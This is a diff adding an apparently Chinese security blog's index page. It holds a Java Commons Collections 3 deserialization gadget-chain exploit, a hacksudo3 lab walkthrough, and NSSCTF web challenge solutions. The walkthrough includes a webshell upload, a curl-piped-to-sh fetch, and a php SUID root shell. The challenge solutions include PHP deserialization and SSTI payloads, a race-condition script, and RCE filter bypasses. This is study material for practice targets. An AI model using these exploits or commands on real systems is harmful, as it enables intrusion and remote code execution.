+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file://target\\classes\\Test.class&quot;)&#125;);
+//        Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Test&quot;);
+//        c.newInstance();
+
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+//        Transformer[] transformers = new Transformer[]&#123;
+//                new ConstantTransformer(templates)
+//                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+//                &#125;;
+//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//
+//        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+//        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+//        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+//
+//        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+//                .getDeclaredConstructor(Class.class, Map.class);
+//        constructor.setAccessible(true);
+//        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class)
+                ,new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+                HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>最后再改成lazyMap的就行了<br><img src="https://img-blog.csdnimg.cn/f16e35938f3942118d735d2f9e0ba61f.png" alt="在这里插入图片描述"></p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file://target\\classes\\Test.class&quot;)&#125;);
+//        Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Test&quot;);
+//        c.newInstance();
+
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+//        Transformer[] transformers = new Transformer[]&#123;
+//                new ConstantTransformer(templates)
+//                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+//                &#125;;
+//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//
+//        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+//        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+//        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+//
+//        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+//                .getDeclaredConstructor(Class.class, Map.class);
+//        constructor.setAccessible(true);
+//        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class)
+                ,new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Constructor annotationInvocationHandlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+
+
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        InvocationHandler lzInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lzMap);
+        Map proxyLazyMap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(), lzMap.getClass().getInterfaces(), lzInvocationHandler);
+
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyLazyMap);
+
+
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/09/CommonCollections3%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">hacksudo3 通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>一开始桥接错网卡了 搞了半天 改回来就行了</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/77b085a4965945089e4efd752219fcd4.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/6a78d32b8bc746239c8cf3583c4ce9b4.png" alt="在这里插入图片描述"><br>大概看了一眼没什么有用的信息 然后对着login.php跑了一下弱口令 sqlmap<br>都没跑出来 那么利用点应该不在这 考虑到之前有过dirsearch字典太小扫不到东西的经历<br>换个gobuster扫一下<br><img src="https://img-blog.csdnimg.cn/3dee063911db44ce96cbcc491d0ac026.png" alt="在这里插入图片描述"><br>先看看generator.php<br><img src="https://img-blog.csdnimg.cn/a9025eb98b0445379fc124f0e753ffbe.png" alt="在这里插入图片描述">随便填点东西执行一下 感觉像命令注入<br><img src="https://img-blog.csdnimg.cn/c51178f60f214846af55040ad8f77d83.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bb57ad44e67047758e2f5fe366003b4b.png" alt="在这里插入图片描述"><br>尝试弹个shell<br>没成功<br>那就写了个一句话 然后用蚁剑传shell<br><img src="https://img-blog.csdnimg.cn/aeaa9d7243ee4884879b9e01449decf5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda42949852141f48c83230df31ecc10.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6a6885383b3d40bfa310e0efe06c5769.png" alt="在这里插入图片描述"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/9ea476d0bf444708a1febdf92d6655e2.png" alt="在这里插入图片描述"></p>
+<p>看看还有没有用户,有可能待会会切过去<br><img src="https://img-blog.csdnimg.cn/00a360113c734409afbdee01f52b3dfd.png" alt="在这里插入图片描述"><br>用linpeas枚举脆弱性<br><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br><img src="https://img-blog.csdnimg.cn/c864be3fe2cb4dbc8033971314fc5cde.png" alt="在这里插入图片描述"></p>
+<p>没看见特别显眼的<br><img src="https://img-blog.csdnimg.cn/7636f4070eaf40b58bcd57050d9334dd.png" alt="在这里插入图片描述"><br>版本过高<br>考虑到有个hacksudo的用户<br>再收集一波信息看看能不能切过去<br>发现有个hacksudo的文件 <img src="https://img-blog.csdnimg.cn/50502f6f887c49aebd25668c9bc0def7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7389c521ab462185fdd0474acd218e.png" alt="在这里插入图片描述"><br>有加密 一眼凯撒<br><img src="https://img-blog.csdnimg.cn/9d1b8d0b91174a96ba8c3195570fcecb.png" alt="试试"><br><img src="https://img-blog.csdnimg.cn/5d7b8c1ddb5c49a38264fce2174de9b9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0b55f6c69e6643899def33c14f9a1253.png" alt="在这里插入图片描述"></p>
+<p>没有sudo权限<br><img src="https://img-blog.csdnimg.cn/4b97b8f4a9494eefb8c1be96d0ff31cc.png" alt="在这里插入图片描述"><br>在work路径下发现sh文件<br>没执行权限<br>也没看见相关的计划任务<br>再传个linpeas枚举<br><img src="https://img-blog.csdnimg.cn/dfa91d083f1b478ab029c730db82e9b4.png" alt="在这里插入图片描述"><br>可以lxd提权<br><img src="https://img-blog.csdnimg.cn/696ebe4ba82647f79f404a46cc5753b1.png" alt="在这里插入图片描述"><br>也可以view 或 php提权<br>这里用php提权</p>
+<pre><code class="bash">CMD=&quot;/bin/sh&quot;
+./home/hacksudo/locker/php -r &quot;posix_setuid(0); system(&#39;$CMD&#39;);&quot;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e187ecf8f2a44c7fbc974ae3193d7547.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/02/NSS%E5%88%B7web3/">
+        <h2 class="post-title">NSS刷web3</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster<img src="https://img-blog.csdnimg.cn/8b1fb6bdc01b4951bb36f01d09ee4ea1.png" alt="在这里插入图片描述"></h1><h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><p>这题会匹配A或B类<br>如 <code>&quot;A&quot;:1:</code><br>绕不过去 可以考虑快速析构</p>
+<pre><code class="c">&lt;?php
+class A&#123;
+    public $code = &quot;&quot;;
+    function __call($method,$args)&#123;
+        eval($this-&gt;code);
+        
+    &#125;
+    function __wakeup()&#123;
+        $this-&gt;code = &quot;&quot;;
+    &#125;
+&#125;
+
+class B&#123;
+    public $a;
+    function __destruct()&#123;
+        echo $this-&gt;a-&gt;a();
+    &#125;
+&#125;
+$A = new A();
+$poc = new B();
+$poc -&gt; a = $A;
+$A -&gt;code = &#39;phpinfo();&#39;;
+echo serialize($poc);
+
+// if(isset($_REQUEST[&#39;poc&#39;]))&#123;
+//     preg_match_all(&#39;/&quot;[BA]&quot;:(.*?):/s&#39;,$_REQUEST[&#39;poc&#39;],$ret);
+//     if (isset($ret[1])) &#123;
+//         foreach ($ret[1] as $i) &#123;
+//             if(intval($i)!==1)&#123;
+//                 exit(&quot;you want to bypass wakeup ? no !&quot;);
+//             &#125;
+//         &#125;
+//         unserialize($_REQUEST[&#39;poc&#39;]);    
+//     &#125;
+
+
+// &#125;
+</code></pre>
+<p>生成的序列化字符串手动删除最后一个花括号<br>然后试了一下<code>system</code>不能用 应该是进disable_functions了<br><img src="https://img-blog.csdnimg.cn/94758239f870438596c44fe299a450a9.png" alt="在这里插入图片描述"><br>那直接上蚁剑用插件绕<br><img src="https://img-blog.csdnimg.cn/a03ba83d3ef740dba28cfdcf944a55bc.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h1><p><img src="https://img-blog.csdnimg.cn/929fbdef67c148f9bc82d3b409b46620.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-easy-html"><a href="#HNCTF-2022-Week1-easy-html" class="headerlink" title="[HNCTF 2022 Week1]easy_html"></a>[HNCTF 2022 Week1]easy_html</h1><p><img src="https://img-blog.csdnimg.cn/40a6fc60e7414f7da9ccbf337037c400.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5473c604e4584b2cbdaf2d6c5b9eb705.png" alt="在这里插入图片描述"></p>
+<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><pre><code class="bash">?code=`l&#39;&#39;s /&gt;1`;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a6ef59115d454ef69384a6f2e6919a99.png" alt="在这里插入图片描述"></p>
+<pre><code class="lua">?code=`t&#39;&#39;ac  /fffffffffflagafag&gt;1`;
+</code></pre>
+<h1 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h1><p>Ginkgo传base64加密的payload<br>然后发现不能用<code>system</code> 看看<code>disable_functions</code><br><img src="https://img-blog.csdnimg.cn/04c33911437748b2a8c620e374c496b5.png" alt="在这里插入图片描述"><br>拿蚁剑绕<br><img src="https://img-blog.csdnimg.cn/51dbd3a264a04045ac815322c0d59b65.png" alt="在这里插入图片描述"><br>其中base64解码后是 <code>eval($_POST[1]);</code><br><img src="https://img-blog.csdnimg.cn/0eadf36f8b0749b29df08bed36b8a3a6.png" alt="在这里插入图片描述"><br>多试几个 我不知道最终成的是那个</p>
+<h1 id="SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1><p>先读flag.php<br>说在根目录<br><img src="https://img-blog.csdnimg.cn/0149137a4b6c42a68e70f661e489dd86.png" alt="在这里插入图片描述"></p>
+<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><p>session包含 条件竞争<br>早jb忘了 有空重新看一下 这里直接用脚本了</p>
+<pre><code class="python">import io
+import requests
+from threading import Thread
+
+url = &#39;http://node4.anna.nssctf.cn:28944&#39;
+session_id = &#39;a&#39;
+
+
+def POST(session):
+    file = io.BytesIO(b&#39;a&#39; * 1024 * 5)
+    times = 0
+    while True:
+        session.post(url=url,
+                     data=&#123;
+                         &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#39;cat /nssctfasdasdflag&#39;);echo md5(&#39;1&#39;);?&gt;&quot;&#125;,
+                     cookies=&#123;&#39;PHPSESSID&#39;: session_id&#125;,
+                     files=&#123;&quot;file&quot;: (&#39;a.txt&#39;, file)&#125;,
+                     )
+        print(f&#39;上传文件&#123;times&#125;&#39;)
+        times += 1
+
+
+def GET(session):
+    geturl = url + f&#39;?file=/tmp/sess_&#123;session_id&#125;&#39;
+    print(geturl)
+    while True:
+        response = session.get(url=geturl)
+        if &#39;c4ca4238a0b923820dcc509a6f75849b&#39; in response.text:
+            print(response.text)
+            break
+        else:
+            print(&#39;[+]retry-----&#39;)
+
+
+if __name__ == &#39;__main__&#39;:
+    with requests.session() as session:
+        t1 = Thread(target=POST, args=(session,))
+        t1.daemon = True
+        t1.start()
+        GET(session)
+</code></pre>
+<h1 id="HNCTF-2022-Week1-easy-upload"><a href="#HNCTF-2022-Week1-easy-upload" class="headerlink" title="[HNCTF 2022 Week1]easy_upload"></a>[HNCTF 2022 Week1]easy_upload</h1><p>直接传一句话就进去了</p>
+<p><img src="https://img-blog.csdnimg.cn/20a6155dfa7f4d93a0613c9575bf3199.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h1><p>ffifdyop<br><img src="https://img-blog.csdnimg.cn/20ecb8df280041f1b8cf1b6573f769c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b2bebaadaa5b4e8b91f94a3ede2faaf8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/faf56fc4d8f34e0b91b6556651722f5f.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-What-is-Web"><a href="#HNCTF-2022-Week1-What-is-Web" class="headerlink" title="[HNCTF 2022 Week1]What is Web"></a>[HNCTF 2022 Week1]What is Web</h1><p><img src="https://img-blog.csdnimg.cn/1bba48f64e1d42beb7c5eae14dede115.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-is-secret"><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret<img src="https://img-blog.csdnimg.cn/51927d7ea6734b9ca35f32e8ed180b08.png" alt="在这里插入图片描述"></h1><p>RC4是对称密码 这里给key了<br><img src="https://img-blog.csdnimg.cn/c8c0e388b8744ac298d14e26144eecf2.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/1653c0ac0015470e9e4b32aa134e5771.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fa710c98fab044cdb657769c60c7669c.png" alt="| 和 read 都不能用"><br><code>&#123;&#123;lipsum.__globals__.os.popen('cat /f*')['re''ad']()&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/08fdfa58b8f143ee84531f18851d49fd.png" alt="在这里插入图片描述"></p>
+<h1 id="WUSTCTF-2020-朴实无华"><a href="#WUSTCTF-2020-朴实无华" class="headerlink" title="[WUSTCTF 2020]朴实无华"></a>[WUSTCTF 2020]朴实无华</h1><p><img src="https://img-blog.csdnimg.cn/a8dea9c2f3774028817977cf83b735ea.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><p><img src="https://img-blog.csdnimg.cn/a5a7e0f839324539840be82eed35fcc3.png" alt="在这里插入图片描述"><br>离谱正则 考虑绕正则回溯次数绕过</p>
+<pre><code class="lua">import requests
+payload = &#39;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#39; + &quot;@&quot;*(1000000) + &#39;&quot;&#125;&#39;
+res = requests.post(&quot;http://node4.anna.nssctf.cn:28625/&quot;,
+                    data=&#123;&quot;letter&quot;: payload&#125;)
+print(res.text)
+</code></pre>
+<h1 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h1><p>session伪造 key是猜的 这题没什么道理<br><img src="https://img-blog.csdnimg.cn/8ff8332a6a544bcd955d28309be06ad0.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-Interesting-http"><a href="#HNCTF-2022-Week1-Interesting-http" class="headerlink" title="[HNCTF 2022 Week1]Interesting_http"></a>[HNCTF 2022 Week1]Interesting_http</h1><p>post 传 want&#x3D;flag<br>cookie改admin<br>XFF改本地</p>
+<h1 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h1><p><img src="https://img-blog.csdnimg.cn/7b98d874405d46c6a9663a85ce8a9b9e.png" alt="在这里插入图片描述"></p>
+<p>callUserFunc对大小写不敏感<img src="https://img-blog.csdnimg.cn/0d28c6054615425f9876074cc92c102b.png" alt="在这里插入图片描述"><br>改NSS2然后查看源码</p>
+<h1 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h1><p>登录处存在sql注入<br>database被ban了</p>
+<p>通过不存在的方法来得到数据库名<br>然后extractvalue没给ban<br><img src="https://img-blog.csdnimg.cn/b667447558124723afeee8b03bbe5b43.png" alt="在这里插入图片描述"><br>然后在查列名的时候发现column被ban了<br>题目叫join-us 很容易能想到用<code>join</code>无列名注入</p>
+<p><img src="https://img-blog.csdnimg.cn/44c2c5e46c934d0ca12f859a1f39e7cd.png" alt="在这里插入图片描述"></p>
+<h1 id="HUBUCTF-2022-新生赛-HowToGetShell"><a href="#HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 新生赛]HowToGetShell"></a>[HUBUCTF 2022 新生赛]HowToGetShell</h1><p><img src="https://img-blog.csdnimg.cn/faaddab264204836ae9ae54502af1bd3.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h1><pre><code class="php">&lt;?php
+ 
+class lyh&#123;
+    public $lt;
+    public $lly;
+     
+     function  __destruct()
+     &#123;
+        $a = $this-&gt;lt;
+
+        $a($this-&gt;lly);
+     &#125;
+    
+    
+&#125;
+$poc = new lyh();
+$poc-&gt;lt = &quot;system&quot;;
+$poc-&gt;lly = &quot;tac /f*&quot;;
+echo serialize($poc);
+</code></pre>
+<p><code>nss=O:3:&quot;lyh&quot;:2:&#123;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:7:&quot;tac /f*&quot;;&#125;</code></p>
+<h1 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h1><p><img src="https://img-blog.csdnimg.cn/0211570563784f82b19d3636aa0949bb.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h1><p><img src="https://img-blog.csdnimg.cn/cc24c7a29711413992ce39ca1fef7dc4.png" alt="在这里插入图片描述"><br><code>$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></p>
+<p>assert($POST[_]);<br>因为是get 记得url编码<br>这里发现直接执行命令不行 通过phpinfo得知很多命令都ban了 那么还是考虑写个shell 用蚁剑绕<br><img src="https://img-blog.csdnimg.cn/b108ba97875448c78fd02205e3f366da.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-where-am-i"><a href="#SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="[SWPUCTF 2022 新生赛]where_am_i"></a>[SWPUCTF 2022 新生赛]where_am_i</h1><p>没头绪<br>看评论说是社工<br>那么应该是要电话号码<br>百度搜图得知 该地点是<code>山水间·古迹酒店</code>  <code>暑袜北一街145号</code><br><img src="https://img-blog.csdnimg.cn/dcb284d0cbaa4f6ebc235c495fe0e8b3.png" alt="在这里插入图片描述"><br>把括号删了输入就行</p>
+<p>没写明白这题为什么在WEB里</p>
